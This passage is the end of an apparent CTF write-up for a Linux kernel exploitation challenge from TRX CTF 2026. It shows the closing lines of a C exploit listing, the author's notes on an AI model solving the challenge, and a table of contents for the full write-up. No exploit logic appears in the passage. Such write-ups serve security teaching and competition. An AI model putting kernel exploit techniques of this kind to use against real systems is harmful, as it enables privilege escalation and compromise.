+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><h2 id=notes>Notes</h2><p>I was pretty excited about this challenge. I know that it isn&rsquo;t super hard but I think that the vulnerability is pretty cool. When doing tests before the CTF codex with gpt-5.4 wasn&rsquo;t able to solve it but unfortunately gpt-5.5 was released the day before the CTF and was able to one-shot this challenge (it didn&rsquo;t get a huge amount of solves but still&mldr;). I&rsquo;m not against people using LLMs for CTFs but seeing your challenge getting solved like that is not a great experience. After a bit of thinking I came to the conclusion that I won’t write challenges for LLM-allowed CTFs going forward—it’s just not worth it.</p></div></section><section class=page__aside><div><p>kernel pwn challenge that I wrote for TRX CTF 2026</p><p>By prosti,
+2026-04-25</p><hr>On this page:<section><nav id=TableOfContents><ol><li><a href=#description>Description</a></li><li><a href=#source-code>Source code</a></li><li><a href=#brief-overview-of-the-module>Brief overview of the module</a></li><li><a href=#spotting-the-vulnerability>Spotting the vulnerability</a></li><li><a href=#exploiting>Exploiting</a></li><li><a href=#flag>Flag</a></li><li><a href=#exploit>Exploit</a></li><li><a href=#notes>Notes</a></li></ol></nav></section></div></section><footer class=page__footer><p></p><br><br><p>Made with love by <strong>@Erge</strong>, <strong>@leave</strong> and <strong>@prosti</strong>.</p></footer></div></body></html>
